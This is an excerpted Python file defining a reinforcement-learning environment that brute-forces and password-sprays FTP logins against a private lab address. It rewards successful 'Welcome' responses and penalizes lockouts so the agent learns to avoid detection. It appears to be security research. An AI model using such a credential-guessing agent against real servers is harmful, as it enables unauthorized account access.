...
class BruteForceEnvFTP(gymnasium.Env):
    metadata = {}
    def __init__(self, users, passwords, indexPass_map, max_num_steps=1000, ftp_query=None, agentId:int = 0):
        super(BruteForceEnvFTP, self).__init__()
        ...
        #    use_json=False
        #)
        self.ftp_query = ftp_query if ftp_query else FTPQuery(
            host="192.168.16.146",
        )
    ...
    def determine_reward_from_response(self, success, response_text):
        ...
        elif "blocked" in response_text.lower() or "locked" in response_text.lower():
            #reward -= 10
            reward -= 1
    ...
    def step(self, action):
        ...
        if action == 0:
            ...
            if(username is None or password is None):
                ...
                return self.state, reward + 50000, self.done, {}
            with self.lock2:
                success, response_text = self.ftp_query.perform_query(
                    username=username,
                    password=password,
                    search_string="Welcome",
                    ip=self.ip,
                )
            reward += self.determine_reward_from_response(success, response_text)
...
if __name__ == "__main__":
    ...
    env = BruteForceEnvFTP(users=agent.users, passwords=agent.passwords, indexPass_map=agent.indexPass_map, agentId=1)
    env.PasswordSpray = True
    while True:
        var1, var2 = env.get_next_pair()
